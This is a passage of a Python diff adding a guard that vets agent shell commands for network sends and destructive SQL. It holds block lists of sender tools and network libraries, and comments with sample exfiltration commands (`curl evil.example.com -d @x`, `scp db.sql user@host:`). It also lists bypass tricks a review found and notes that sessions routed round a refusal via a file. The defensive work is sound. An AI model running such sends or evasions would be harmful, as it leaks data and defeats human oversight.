+#   - a WRAPPER, a program that runs another command (env, sudo, timeout, nice,
+#     time, xargs ...), makes EVERY later word a candidate executable, because
+#     each wrapper takes its own options and option values and a parser that
+#     guessed them would be one unknown flag away from a hole; a later word
+#     holding spaces is a quoted command string and is read as a command;
+#   - the string a shell runs with -c, and the words eval runs, are commands too.
+# It reads the command twice: as properly quoted shell words, and as raw text
+# split at every boundary character, so a command substitution or backtick
+# inside a quoted string is still seen. Either reading finding a sender is
+# enough. Over-reading costs only the plain-fetch check below; under-reading
+# lets a send through.
+SENDER = (r"curl|wget|nc|ncat|netcat|telnet|ftp|sftp|scp|rsync|ssh|httpie|http|https"
+          r"|links|lynx|w3m|aria2c|axel|fetch")
+_SENDER_NAMES = frozenset(SENDER.lower().split("|"))
+# Programs whose job is to run another command given as their arguments.
+COMMAND_WRAPPERS = frozenset({
+    "xargs", "sudo", "doas", "env", "time", "nohup", "command", "exec", "builtin",
+    "watch", "timeout", "gtimeout", "parallel", "nice", "renice", "ionice", "stdbuf",
+    "setsid", "caffeinate", "unbuffer", "flock", "chronic", "chroot", "taskset", "chrt",
+    "script", "nsenter", "unshare", "firejail", "proxychains", "proxychains4", "torsocks",
+    "sandbox-exec", "arch", "su", "runuser", "pkexec", "coproc"})
+# Shell reserved words after which the next word is in command position.
+_COMMAND_KEYWORDS = frozenset({"then", "do", "else", "elif", "if", "while", "until",
+                               "!", "{"})
+_SHELLS = re.compile(r"^(?:ba|z|da|k|c|tc|fi|mk)?sh$")
+_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(?:\[[^]]*\])?\+?=")
+_RAW_BOUNDARY = re.compile(r"[|;&(){}`\n]")
+
+# AN INTERPRETER THAT IMPORTS A NETWORK CLIENT IS ALSO A SENDER, and this half is
+# what keeps the narrower executable test from becoming a hole: `python3 -c "import
+# requests; requests.post(...)"` has no sender in command position. Matching the
+# library reference catches it. A `python3 -c` that only opens a local file and
+# writes a string — the exact shape loop #283 was about — matches neither and is
+# correctly allowed through to the write-target checks below.
+NET_CLIENT = re.compile(
+    r"\b(?:urllib|urlopen|requests\.|httpx|http\.client|httplib|aiohttp|websockets?"
+    r"|net/http|Net::HTTP|LWP|WWW::Mechanize|axios|node-fetch|XMLHttpRequest"
+    r"|socket\.(?:socket|create_connection)|fetch\()",
+    re.I)
+URL_RE = re.compile(r"https?://([A-Za-z0-9._-]+)")
+
+# A REMOTE COPY TARGET IS A HOST TOO, and this was a real gap rather than a
+# consequence of the loop #283 change — URL_RE has only ever understood `http://`,
+# so `scp db.sql user@host:/tmp` named no host, passed the allowlist by having
+# nothing to check, and was allowed. Found 2026-08-13 by writing
+# ops/egress-scope-selftest.py, which asserted the property the guard was assumed
+# to have; the assertion failed and the assumption was wrong.
+#
+# Deliberately narrow: it matches the `user@host:` form that scp and rsync use for
+# a remote path. It is only ever consulted when a sender is already in command
+# position, so an email address quoted in a git commit message reaches it never.
+REMOTE_TARGET_RE = re.compile(r"[\w.+-]+@([A-Za-z0-9][A-Za-z0-9.-]*\.[A-Za-z]{2,}):")
+
+# ── IS THIS COMMAND ACTUALLY RUNNING SQL? (loop #240, 2026-08-13) ─────────────
+#
+# SAME DEFECT AS THE EGRESS ONE FIXED EARLIER THE SAME DAY, in the other rule set,
+# and found the same way — by the guard blocking real work. The destructive-SQL
+# patterns scan the whole command string, so `\btruncate\s+(table\s+)?\w` matched
+# the ENGLISH PHRASE "truncate honestly" inside a loop's closing outcome, and the
+# session could not file it. No SQL was involved anywhere in that command.
+#
+# The patterns themselves are right and are NOT loosened: a real TRUNCATE, DROP,
+# unqualified DELETE or unqualified UPDATE stays blocked. What changes is that they
+# are consulted only when the command plausibly EXECUTES SQL at all. Prose that
+# quotes a SQL keyword is not a database operation, exactly as prose that quotes a
+# URL is not a network send.
+#
+# Deliberately generous about what counts as SQL context: a false positive here
+# costs a blocked session, a false negative costs a table. Anything that opens a
+# database, names a .sql file, or executes a statement string qualifies.
+SQL_CONTEXT = re.compile(
+    r"(?:\bpsql\b|\bpg_dump\b|\bpgcli\b|\bmysql\b|\bsqlite3?\b|\bdb-tap\b|\bmigrate\b"
+    r"|\.sql\b|\bDATABASE_URL\b|\bCARR_DB_[A-Z_]+\b|\bneonctl\b"
+    r"|\bcur\.execute\b|\bconn\.execute\b|\bcursor\(\)|\bexecute_many\b"
+    r"|\bpsycopg\b|\bsqlalchemy\b|--command\b|\s-c\s+['\"])",
+    re.I)
+
+# The labels above that are ONLY meaningful against a database. Kept as an explicit
+# set rather than inferred from the pattern, so adding a non-SQL rule later cannot
+# accidentally inherit the SQL gate.
+SQL_LABELS = frozenset({"DROP", "TRUNCATE", "unqualified DELETE", "unqualified UPDATE"})
+
+# DESCRIBING A DESTRUCTIVE COMMAND IS NOT RUNNING ONE — the same carve-out this
+# guard already makes for SQL keywords in prose (loop #240), applied to the
+# command-shaped rules. The patterns stay exactly as strict; they are simply
+# consulted against the part of the command the shell will actually EXECUTE,
+# because a quoted --body and a heredoc body are handed to a program as bytes.
+#
+# Measured on 2026-08-14, three times in one session: a pull-request body
+# reporting a fix to the writer gate, a comment verifying that fix had landed,
+# and a probe command investigating this very guard were each refused for
+# naming the command they were about. The workaround every time was moving the
+# text into a file, which is precisely how a gate teaches people to route
+# around it — and a gate people route around has already stopped working.
+#
+# THE CATASTROPHIC LABELS ARE DELIBERATELY ABSENT from this set: filesystem
+# format, raw device write and the two private-key rules keep no carve-out at
+# all. A wiped disk or a leaked key is unrecoverable, those phrases are
+# vanishingly rare in honest prose, and the cost of a false refusal there is a
+# rephrase rather than a restore. Conservatism belongs at the extremes.
+PROSE_SAFE_LABELS = frozenset({
+    "force push", "hard reset", "history rewrite", "forced clean",
+    "recursive/forced delete", "secure delete",
+})
+
+
+def is_sql_context(cmd):
+    """True when the command could actually reach a database."""
+    return bool(SQL_CONTEXT.search(cmd))
+
+
+_URL_IN_TOKEN = re.compile(r'https?://[^\s\'"<>]+', re.I)
+
+
+def urls_in(cmd):
+    """Every URL this command names: each http(s) URL in its shell words, plus
+    every destination a curl or wget in it is given WITHOUT a scheme (see
+    fetch_targets), written as `http://<target>` the way both tools read it."""
+    try:
+        tokens = shell_tokens(cmd)
+    except ValueError:
+        tokens = re.split(r'[\s;&|]', cmd)
+    urls = [url for token in tokens for url in _URL_IN_TOKEN.findall(token)]
+    for exe, args in invocations_in(cmd):
+        if exe in READ_ONLY_FETCHERS:
+            urls += [t for t in fetch_targets(exe, args) if t not in urls]
+    return urls
+
+
+def url_host(url):
+    """The URL's hostname, or "invalid-url" when it has none or does not parse."""
+    try:
+        return urlsplit(url).hostname or "invalid-url"
+    except ValueError:
+        return "invalid-url"
+
+
+def hosts_in(cmd):
+    """Every host this command could reach: URL hosts plus remote-copy targets."""
+    return [url_host(url) for url in urls_in(cmd)] + REMOTE_TARGET_RE.findall(cmd)
+
+
+# ── A DESTINATION WITHOUT A SCHEME (2026-10-08) ───────────────────────────────
+#
+# curl and wget read a bare `evil.example.com/path` as a URL. The host check
+# above used to see only `http(s)://` text, so `curl evil.example.com -d @x`
+# named no host, had nothing to fail, and the send went through. So every
+# operand of a curl or wget that can carry a destination is read as one: each
+# positional operand that parses as a host (a dotted name, an IP, a single
+# label, with optional user@, :port and path), the value of --url, and the
+# values of the options that ROUTE the request somewhere else (a proxy,
+# --connect-to, --resolve, --doh-url), because a body sent through an
+# unlisted proxy has reached that proxy. Option values are skipped by the same
+# arity tables the plain-fetch check uses, so `-o page.html` is a file name,
+# not a host; a numeric word (`--max-time 10` if an arity were ever missed) is
+# never read as a host.
+_HOSTLIKE = re.compile(
+    r"^(?:[^@/\s:]+(?::[^@/\s]*)?@)?"
+    r"(?:\[[0-9A-Fa-f:.]+\]|[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?"
+    r"(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?)*\.?)"
+    r"(?::\d*)?(?:[/?#].*)?$")
+_ROUTE_LONG = frozenset({"url", "proxy", "preproxy", "proxy1.0", "socks4", "socks4a", "socks5",
+                         "socks5-hostname", "doh-url", "connect-to", "resolve"})
+_CURL_ARG_LONG = frozenset({
+    "abstract-unix-socket", "alt-svc", "aws-sigv4", "cacert", "capath", "cert", "cert-type",
+    "ciphers", "config", "connect-timeout", "connect-to", "continue-at", "cookie", "cookie-jar",
+    "create-file-mode", "crlfile", "curves", "data", "data-ascii", "data-binary", "data-raw",
+    "data-urlencode", "delegation", "dns-interface", "dns-ipv4-addr", "dns-ipv6-addr",
+    "dns-servers", "doh-url", "dump-header", "ech", "egd-file", "engine", "etag-compare",
+    "etag-save", "expect100-timeout", "form", "form-escape", "form-string", "ftp-account",
+    "ftp-alternative-to-user", "ftp-method", "ftp-port", "ftp-ssl-ccc-mode",
+    "happy-eyeballs-timeout-ms", "haproxy-clientip", "header", "hostpubmd5", "hostpubsha256",
+    "hsts", "interface", "ip-tos", "ipfs-gateway", "json", "keepalive-cnt", "keepalive-time",
+    "key", "key-type", "krb", "libcurl", "limit-rate", "local-port", "login-options",
+    "mail-auth", "mail-from", "mail-rcpt", "max-filesize", "max-redirs", "max-time",
+    "netrc-file", "noproxy", "oauth2-bearer", "output", "output-dir", "parallel-max", "pass",
+    "pinnedpubkey", "preproxy", "proto", "proto-default", "proto-redir", "proxy",
+    "proxy-cacert", "proxy-capath", "proxy-cert", "proxy-cert-type", "proxy-ciphers",
+    "proxy-crlfile", "proxy-header", "proxy-key", "proxy-key-type", "proxy-pass",
+    "proxy-pinnedpubkey", "proxy-service-name", "proxy-tls13-ciphers", "proxy-tlsauthtype",
+    "proxy-tlspassword", "proxy-tlsuser", "proxy-user", "proxy1.0", "pubkey", "quote",
+    "random-file", "range", "rate", "referer", "request", "request-target", "resolve",
+    "retry", "retry-delay", "retry-max-time", "sasl-authzid", "service-name", "sigalgs",
+    "socks4", "socks4a", "socks5", "socks5-gssapi-service", "socks5-hostname", "speed-limit",
+    "speed-time", "stderr", "telnet-option", "tftp-blksize", "time-cond", "tls-max",
+    "tls13-ciphers", "tlsauthtype", "tlspassword", "tlsuser", "trace", "trace-ascii",
+    "trace-config", "unix-socket", "upload-file", "upload-flags", "url", "url-query", "user",
+    "user-agent", "variable", "write-out"})
+_WGET_ARG_LONG = frozenset({
+    "accept", "accept-regex", "append-output", "ask-password", "backups", "base",
+    "bind-address", "bind-dns-address", "body-data", "body-file", "ca-certificate",
+    "ca-directory", "certificate", "certificate-type", "ciphers", "compression", "config",
+    "connect-timeout", "crl-file", "cut-dirs", "default-page", "directory-prefix",
+    "dns-servers", "dns-timeout", "domains", "exclude-directories", "exclude-domains",
+    "execute", "ftp-password", "ftp-user", "header", "hsts-file", "http-password",
+    "http-user", "include-directories", "input-file", "level", "limit-rate", "load-cookies",
+    "local-encoding", "max-redirect", "method", "output-document", "output-file", "password",
+    "pinnedpubkey", "post-data", "post-file", "prefer-family", "private-key",
+    "private-key-type", "progress", "proxy-password", "proxy-user", "quota", "random-file",
+    "read-timeout", "referer", "regex-type", "reject", "reject-regex", "rejected-log",
+    "remote-encoding", "report-speed", "restrict-file-names", "retry-on-http-error",
+    "save-cookies", "secure-protocol", "timeout", "tries", "use-askpass", "user",
+    "user-agent", "wait", "waitretry", "warc-cdx", "warc-dedup", "warc-file", "warc-header",
+    "warc-max-size", "warc-tempdir"})
+
+
+def _as_url(word):
+    return word if "://" in word else f"http://{word}"
+
+
+def _route_targets(name, value):
+    """Destinations carried by a routing option's value."""
+    if name in ("connect-to", "resolve"):
+        # HOST1:PORT1:HOST2:PORT2 / HOST:PORT:ADDR[,ADDR] — every name or address in it.
+        fields = re.split(r"[:,]", value.strip("[]"))
+        return [_as_url(f) for f in fields if f and not f.isdigit() and _HOSTLIKE.match(f)]
+    return [_as_url(value)] if value and _HOSTLIKE.match(value.split("://", 1)[-1]) else []
+
+
+def fetch_targets(tool, words):
+    """Every destination one curl/wget invocation is given without an http(s)
+    scheme, as `http://...` URLs (see A DESTINATION WITHOUT A SCHEME)."""
+    arg_long = _CURL_ARG_LONG if tool == "curl" else _WGET_ARG_LONG
+    arg_short = _CURL_ARG_SHORT if tool == "curl" else _WGET_ARG_SHORT
+    targets, i, operands_only = [], 0, False
+    while i < len(words):
+        w = words[i]
+        i += 1
+        if not operands_only and w == "--":
+            operands_only = True
+        elif not operands_only and w.startswith("--") and len(w) > 2:
+            name, eq, value = w[2:].partition("=")
+            name = name.lower()
+            if name in arg_long or name in _ROUTE_LONG:
+                if not eq and i < len(words):
+                    value = words[i]
+                    i += 1
+                if name in _ROUTE_LONG:
+                    targets += _route_targets(name, value)
+        elif not operands_only and w.startswith("-") and len(w) > 1:
+            cluster = w[1:]
+            for k, ch in enumerate(cluster):
+                if ch in arg_short:
+                    value = cluster[k + 1:]
+                    if not value and i < len(words):
+                        value = words[i]
+                        i += 1
+                    if tool == "curl" and ch == "x":
+                        targets += _route_targets("proxy", value)
+                    break
+        elif not re.match(r"https?://", w, re.I) and not w.isdigit() and _HOSTLIKE.match(w):
+            targets.append(_as_url(w))
+    return targets
+
+
+def _exe_name(word):
+    """A word read as an executable name: path and stray quoting removed, lowercased."""
+    return os.path.basename(word.strip("'\"\\")).lower()
+
+
+def _shell_c_script(words):
+    """The script a shell runs with -c (`bash -c`, `sh -ec`), or None."""
+    for k, w in enumerate(words[:-1]):
+        if w.startswith("-") and not w.startswith("--") and "c" in w:
+            return words[k + 1]
+    return None
+
+
+# Option grammar of the wrappers whose program position can be computed:
+# (short options taking a value, short flags, long options taking a value,
+#  long flags, operands before the program, pattern each operand must match).
+# A wrapper missing here, or any option missing from its entry, means the
+# program position is unknown, and the caller then reads every word as a
+# candidate. Under-modelling an option would hide the sender behind it, so an
+# unknown option fails closed rather than being guessed at.
+_DURATION = r"\d+(?:\.\d+)?[smhd]?"
+_WRAPPER_GRAMMAR = {
+    "timeout": ("sk", "v", {"--signal", "--kill-after"},
+                {"--preserve-status", "--foreground", "--verbose"}, 1, _DURATION),
+    "gtimeout": ("sk", "v", {"--signal", "--kill-after"},
+                 {"--preserve-status", "--foreground", "--verbose"}, 1, _DURATION),
+    "nohup": ("", "", set(), set(), 0, None),
+    "nice": ("n", "", {"--adjustment"}, set(), 0, None),
+    "env": ("uCSP", "i0v", {"--unset", "--chdir", "--split-string"},
+            {"--ignore-environment", "--null", "--debug"}, 0, None),
+    "sudo": ("ughprtUCDT", "AbBEeHiKklNnPSsVv",
+             {"--user", "--group", "--host", "--prompt", "--role", "--type",
+              "--other-user", "--close-from", "--chdir", "--command-timeout"},
+             {"--preserve-env", "--login", "--shell", "--non-interactive",
+              "--stdin", "--background", "--set-home", "--askpass", "--bell",
+              "--reset-timestamp", "--remove-timestamp"}, 0, None),
+    "flock": ("wEc", "sxnuoFh",
+              {"--timeout", "--wait", "--conflict-exit-code", "--command"},
+              {"--shared", "--exclusive", "--nonblock", "--nb", "--unlock",
+               "--close", "--no-fork", "--verbose"}, 1, None),
+    "chroot": ("", "", {"--userspec", "--groups"}, {"--skip-chdir"}, 1, None),
+    "xargs": ("aEIdLnPsJRS", "0oprtxie",
+              {"--arg-file", "--delimiter", "--eof", "--replace", "--max-lines",
+               "--max-args", "--max-procs", "--max-chars"},
+              {"--null", "--open-tty", "--interactive", "--no-run-if-empty",
+               "--verbose", "--exit", "--show-limits"}, 0, None),
+    "sandbox-exec": ("fnpD", "", set(), set(), 0, None),
+    "time": ("of", "pal", {"--output", "--format"},
+             {"--portability", "--append", "--verbose"}, 0, None),
+    "ionice": ("cnp", "t", {"--class", "--classdata", "--pid"},
+               {"--ignore"}, 0, None),
+}
+
+
+def _wrapped_program(exe, rest):
+    """Index in `rest` of the program wrapper `exe` runs, or None when the
+    position cannot be computed for certain (see _WRAPPER_GRAMMAR)."""
+    grammar = _WRAPPER_GRAMMAR.get(exe)
+    if grammar is None:
+        return None
+    short_value, short_flag, long_value, long_flag, operands, operand_re = grammar
+    i = 0
+    while i < len(rest):
+        w = rest[i]
+        if w == "--":
+            i += 1
+            break
+        if w.startswith("--"):
+            name = w.split("=", 1)[0]
+            if name not in long_value and name not in long_flag:
+                return None
+            i += 2 if (name in long_value and "=" not in w) else 1
+            continue
+        if w.startswith("-") and len(w) > 1:
+            if exe == "nice" and w[1:].isdigit():
+                i += 1
+                continue
+            takes_next = False
+            for j, c in enumerate(w[1:], 1):
+                if c in short_value:
+                    takes_next = j == len(w) - 1
+                    break
+                if c not in short_flag:
+                    return None
+            i += 2 if takes_next else 1
+            continue
+        if exe == "env" and _ASSIGNMENT.match(w):
+            i += 1
+            continue
+        break
+    for _ in range(operands):
+        if i >= len(rest) or (operand_re and not re.fullmatch(operand_re, rest[i])):
+            return None
+        i += 1
+    if i >= len(rest) or rest[i].startswith("-"):
+        return None
+    return i
+
+
+def command_invocations(words, depth=0):
+    """Every (executable, its argument words) one simple command could run,
+    after normalising command position (see THE SENDER TEST)."""
+    i = 0
+    while i < len(words) and (_ASSIGNMENT.match(words[i]) or words[i] in _COMMAND_KEYWORDS):
+        i += 1
+    if i >= len(words):
+        return []
+    exe, rest = _exe_name(words[i]), words[i + 1:]
+    found = [(exe, rest)]
+    if exe in COMMAND_WRAPPERS:
+        # A word with spaces is a quoted command string (`su -c '...'`,
+        # `sudo sh -c '...'`, `watch '...'`), so it is read as a command.
+        # Every other word is a candidate program, because a wrapper's option
+        # values and operands (`sudo -D /tmp`, `flock /tmp/lk`) can sit in front
+        # of the sender. The scan stops only where _wrapped_program places the
+        # program at a path or at another wrapper: the words after it are that
+        # program's arguments (`timeout 30 ./run.sh fetch <url>`). Past the
+        # recursion cap it does not stop at all, so deep nesting reads every word.
+        p = _wrapped_program(exe, rest)
+        stop = p if p is not None and ("/" in rest[p] or
+                                       _exe_name(rest[p]) in COMMAND_WRAPPERS) else None
+        for k, w in enumerate(rest):
+            if any(c.isspace() for c in w):
+                found += invocations_in(w, depth + 1) if depth < 4 else []
+            elif "://" in w:
+                continue
+            elif k == stop and depth < 4:
+                found += command_invocations(rest[k:], depth + 1)
+                break
+            else:
+                found.append((_exe_name(w), rest[k + 1:]))
+        return found
+    script = " ".join(rest) if exe == "eval" else (
+        _shell_c_script(rest) if _SHELLS.match(exe) else None)
+    if script and depth < 4:
+        found += invocations_in(script, depth + 1)
+    return found
+
+
+def command_executables(words, depth=0):
+    """The executable names of command_invocations."""
+    return [exe for exe, _ in command_invocations(words, depth)]
+
+
+def _command_words(segment):
+    """Shell words of one raw segment; unbalanced quoting falls back to splitting."""
+    try:
+        words = shlex.split(segment, posix=True)
+    except ValueError:
+        words = [w.strip("'\"") for w in segment.split()]
+    return _without_redirects(words)
+
+
+def _without_redirects(words):
+    words = [w for w in words if w not in ("(", ")", "{", "}")]
+    try:
+        return shell_operands(words)[0]
+    except ValueError:
+        return words
+
+
+def invocations_in(cmd, depth=0):
+    """Every (executable, argument words) `cmd` could run, from both the
+    quoted-word reading and the raw boundary-split reading (see THE SENDER TEST)."""
+    found = []
+    try:
+        tokens = shell_tokens(cmd)
+    except ValueError:
+        tokens = []
+    segment = []
+    for token in tokens + [";"]:
+        if token in SHELL_BOUNDARIES:
+            found += command_invocations(_without_redirects(segment), depth)
+            segment = []
+        else:
+            segment.append(token)
+    for raw in _RAW_BOUNDARY.split(cmd):
+        found += command_invocations(_command_words(raw), depth)
+    return found
+
+
+def is_send_context(cmd):
+    """True when the command can actually put bytes on the network.
+
+    Two independent tests, either sufficient: a sending EXECUTABLE in command
+    position, or an interpreter that references a network client library. A
+    command that merely quotes a URL matches neither.
+    """
+    return bool(NET_CLIENT.search(cmd)
+                or _SENDER_NAMES.intersection(exe for exe, _ in invocations_in(cmd)))
+
+# ── THE PLAIN READ-ONLY FETCH (Joe, 2026-10-07) ──────────────────────────────
+#
+# Joe: research should "use the full internet". Until this ruling the Bash path
+# was allowlist-only for EVERY curl, because curl picks its own method and body
+# and so a host list was the only control. That is right for a command that can
+# SEND and wrong for one that can only READ: a GET or a download whose only
+# outbound bytes are a URL carries no more than WebFetch's open-read class does.
+#
+# So an unlisted host is allowed when the whole command is a plain read-only
+# fetch, decided from what the command SAYS — nothing here resolves DNS or runs
+# anything. Since the #1646 post-merge review (2026-10-11) the test is an
+# ALLOWLIST GRAMMAR, not a list of forbidden flags: the review admitted
+# `curl -n`, `wget --post-d=` (a GNU-getopt abbreviation), a .curlrc POST,
+# `| awk -f /dev/stdin`, `chmod +x` then execute, and `--output-dir hooks -O`,
+# each through a flag or stage the deny-list had never named. Now:
+#   - every network executable in command position is curl or wget, named as a
+#     bare word (not ./curl or a path) and called directly (not through
+#     xargs/sudo/env, which hide the URL or the method);
+#   - it runs CONFIGURATION-FREE: curl's first argument is -q (or --disable),
+#     wget carries --no-config and --no-netrc, so no ~/.curlrc, $CURL_HOME,
+#     wgetrc or ~/.netrc can add a body, header or credential the command text
+#     does not show; and the command carries no variable assignment at all
+#     (SSLKEYLOGFILE= writes anywhere, PATH=. picks a local curl);
+#   - every option is one of _FETCH_GRAMMAR's read-only options, spelled in
+#     FULL (an abbreviation, alias or unknown option is refused, so a getopt
+#     prefix can never reach a send option);
+#   - every operand, and --url, is an http(s) URL (a bare host reads as http);
+#   - every other stage is a known pure filter (_FETCH_FILTERS) — anything else,
+#     an interpreter, sed/awk, xargs, chmod, a ./path, is refused;
+#   - a curl that writes a file carries -g (--globoff), so URL globbing cannot
+#     rewrite the destination after it is judged;
+#   - NO DIRECTORY CHANGE AT ALL: a cd, pushd or popd anywhere in the command
+#     (a subshell, a brace group, builtin/command/eval forms) refuses it, and
+#   - a file is written ONLY by curl -o / wget -O naming a LITERAL ABSOLUTE
+#     path directly under FETCH_SCRATCH_ROOT (see _fetch_destination_refusal).
+#     Three review rounds of PR 1695 each found a new way to make a relative
+#     destination land somewhere other than where it was judged (curl URL
+#     globbing, a cd that failed or took an option, shell globs in the word,
+#     logical versus physical '..', CDPATH). Following shell semantics one
+#     trick at a time did not converge, so the guard no longer follows any:
+#     the destination word must already be the place the bytes land. curl -O,
+#     wget's default naming, a > redirect to anything but /dev/null and tee to
+#     a file are all refused; stdout into a filter stage stays allowed;
+#   - nothing the guard cannot read: no $-expansion, backtick or process
+#     substitution anywhere in the command, so the URL seen is the URL sent;
+#   - no interpreter network client and no scp/rsync remote target;
+#   - every unlisted URL passes webfetch_open_read_reason: the length and query
+#     caps, no secret or blob in the query, no credentials, a standard port, and
+#     a public DNS name (no IP, loopback, metadata or private suffix).
+# Anything else falls back to the allowlist, exactly as before.
+#
+# LIMITS, stated plainly. This judges the command text; it does not chase
+# obfuscation. A URL path can still carry up to the open-read cap of text, which
+# is the same residual channel WebFetch has had since 2026-08-09. DNS rebinding
+# is not caught, as for WebFetch. curl -L and wget follow redirects, so a public
+# host can bounce a GET to a loopback address; that GET still carries only the
+# URL out. The new-file and no-symlink checks run before the command, so a
+# path created or swapped between the check and the write is not seen — a race
+# only a concurrent writer can win.
+READ_ONLY_FETCHERS = frozenset({"curl", "wget"})
+_UNREADABLE = re.compile(r"[`]|\$[({A-Za-z_0-9@*#?$!-]|<\(|>\(")
+# curl/wget short options that consume the rest of the cluster (or the next word)
+# as their value. Used by fetch_targets to find destinations in ANY invocation,
+# send or not, so these list every value-taking letter, not only the allowed ones.
+_CURL_ARG_SHORT = frozenset("AbcCdDeEFHKmoQrtTuUwxXYyz")
+_WGET_ARG_SHORT = frozenset("aABDeiIlOoPQRtTUwX")
+_READ_METHODS = frozenset({"GET", "HEAD"})
+# The whole read-only grammar, per tool: (short flags, short options taking a
+# value, long flags, long options taking a value, whole words). A long option
+# must match one of these EXACTLY: both tools accept unique prefixes (`--post-d`)
+# and curl has aliases, so anything not spelled in full here is refused.
+# Value-taking entries whose value is a destination or method are checked in
+# _fetch_grammar_refusal; the rest take a number or a write-out format.
+_FETCH_GRAMMAR = {
+    "curl": (frozenset("sSfLIivO#46gN"), frozenset("omwX"),
+             frozenset({"silent", "show-error", "fail", "fail-with-body", "location", "head",
+                        "include", "verbose", "compressed", "remote-name", "progress-bar",
+                        "no-progress-meter", "ipv4", "ipv6", "http1.1", "http2", "globoff",
+                        "no-buffer"}),
+             frozenset({"output", "max-time", "connect-timeout", "retry", "retry-delay",
+                        "max-redirs", "max-filesize", "write-out", "request", "url"}),
+             frozenset()),
+    "wget": (frozenset("qS46"), frozenset("OTt"),
+             frozenset({"quiet", "no-verbose", "server-response", "spider", "no-clobber",
+                        "no-config", "no-netrc", "inet4-only", "inet6-only"}),
+             frozenset({"output-document", "timeout", "tries", "max-redirect", "read-timeout",
+                        "connect-timeout", "dns-timeout"}),
+             frozenset({"-nv", "-nc"})),
+}
+_NUMERIC_VALUE = re.compile(r"^\d+(?:\.\d+)?[kKmMgG]?$")
+# Downstream stages a fetch may feed: pure filters that neither write a file nor
+# run a program, each with the options that would break that (refused) or the
+# operand count that would. Anything not listed is refused.
+_FETCH_FILTERS = {
+    "head": None, "tail": None, "wc": None, "cut": None, "tr": None, "grep": None,
+    "egrep": None, "fgrep": None, "jq": None, "cat": None, "nl": None, "fold": None,
+    "column": None, "rev": None, "tac": None, "sha256sum": None, "shasum": None,
+    "md5sum": None, "echo": None, "printf": None, "true": None, "false": None,
+    # sort -o/--output writes, -T/--temporary-directory writes scratch files
+    # and --compress-program runs a program; uniq's second operand is an output file.
+    "sort": re.compile(r"^(?:-[^-]*[oT]|--[oct])"),
+    "uniq": "one-operand",
+}
+# The ONE directory a read-only fetch to an unlisted host may write into: the
+# system temp directory, spelled as its realpath (/tmp on Linux; on macOS the
+# /private/var/folders/.../T form, since /var is a symlink there).
+FETCH_SCRATCH_ROOT = os.path.realpath(tempfile.gettempdir())
+# Outputs that write no file: curl -o - / wget -O - (stdout) and /dev/null.
+_NO_FILE_OUTPUTS = frozenset({"-", "/dev/null"})
+# A destination word is plain characters only: no glob (* ? [ ] { }), no ~, $,
+# backquote, '#', quote, backslash, space or parenthesis — so the word the
+# shell hands curl/wget is exactly the word judged here.
+_LITERAL_PATH = re.compile(r"^/[A-Za-z0-9._,+=@%:/-]+$")
+# Directory changers, refused anywhere in a fetch command (no cd is followed).
+_DIRECTORY_CHANGERS = frozenset({"cd", "pushd", "popd", "chdir"})
+
+
+def _inside_git_tree(path):
+    """True when `path` (already real) is inside any git work tree."""
+    while True:
+        if os.path.lexists(os.path.join(path, ".git")):
+            return True
+        parent = os.path.dirname(path)
+        if parent == path:
+            return False
+        path = parent
+
+
+def _fetch_destination_refusal(path):
+    """None if untrusted downloaded bytes may be written to `path`, else why not.
+
+    The only file a fetch may write is a NEW, non-dot file named by a literal
+    absolute path under FETCH_SCRATCH_ROOT, with no glob, ~, $, backquote, '#'
+    or '..', no symlink anywhere on its parent path, outside every git work
+    tree. Nothing is resolved against a working directory, so no cd, glob or
+    '..' semantics can move the write away from the word judged."""
+    root = FETCH_SCRATCH_ROOT
+    rule = f"a fetch may write only a new file named by a literal absolute path under {root}"
+    if not _LITERAL_PATH.match(path or ""):
+        return (f"would write fetched bytes to {path or '(an unnamed file)'!r}: {rule} "
+                f"(no relative path, glob, ~, $, backquote or #)")
+    parts = path.split("/")[1:]
+    if any(p in ("", ".", "..") for p in parts):
+        return f"would write fetched bytes to {path!r}: {rule} (no '..', '.' or empty component)"
+    if parts[-1].startswith("."):
+        return f"would write fetched bytes to a dotfile ({path})"
+    parent = os.path.dirname(path)
+    if root in ("", "/") or not (parent == root or parent.startswith(root + "/")):
+        return f"would write fetched bytes outside the scratch root ({path}): {rule}"
+    if os.path.realpath(parent) != parent or not os.path.isdir(parent):
+        return f"would write fetched bytes through a symlink or missing directory ({path}): {rule}"
+    if os.path.lexists(path):
+        return f"would overwrite an existing path ({path})"
+    if _inside_git_tree(parent):
+        return f"would write fetched bytes inside a repository ({path})"
+    return None
+
+
+def _fetch_url_refusal(word):
+    """None if one fetch operand is an http(s) URL the open-read policy accepts
+    (or an allowlisted host), else why not."""
+    url = word if "://" in word else f"http://{word}"
+    if not re.match(r"https?://", url, re.I):
+        return f"{word.split('://')[0]}:// is not an http(s) read"
+    if host_allowlisted(url_host(url)):
+        return None
+    why = webfetch_open_read_reason(url)
+    return why.replace("WebFetch ", "the fetch ").split(" — blocked")[0] if why else None
+
+
+def _fetch_grammar_refusal(tool, words):
+    """None when one curl/wget invocation is configuration-free, uses only the
+    read-only grammar, names only acceptable URLs, and writes only to safe new
+    files; otherwise the reason it is not."""
+    if tool == "curl" and (not words or words[0] not in ("-q", "--disable")):
+        return "curl must start with -q so no .curlrc can add a body, header or credential"
+    if tool == "wget" and "--no-config" not in words:
+        return "wget needs --no-config so no wgetrc can add a body, header or credential"
+    if tool == "wget" and "--no-netrc" not in words:
+        return "wget needs --no-netrc so no ~/.netrc entry answers a server's login challenge"
+    short_flag, short_value, long_flag, long_value, whole = _FETCH_GRAMMAR[tool]
+    outputs, urls, remote_name, wget_named, spider, globoff = [], [], False, False, False, False
+    i, operands_only = (1 if tool == "curl" else 0), False
+    while i < len(words):
+        w = words[i]
+        i += 1
+        if operands_only or not w.startswith("-") or w == "-":
+            urls.append(w)
+            continue
+        if w == "--":
+            operands_only = True
+            continue
+        if w in whole:
+            continue
+        if w.startswith("--"):
+            name, eq, value = w[2:].partition("=")
+            if name in long_flag and not eq:
+                remote_name |= name == "remote-name"
+                spider |= name == "spider"
+                globoff |= name == "globoff"
+                continue
+            if name not in long_value:
+                return f"{tool} --{name} is not in the read-only fetch grammar"
+            if not eq:
+                if i >= len(words):
+                    return f"{tool} --{name} has no value"
+                value = words[i]
+                i += 1
+            opt = name
+        else:
+            cluster, opt, value = w[1:], None, None
+            for k, ch in enumerate(cluster):
+                if ch in short_flag:
+                    remote_name |= tool == "curl" and ch == "O"
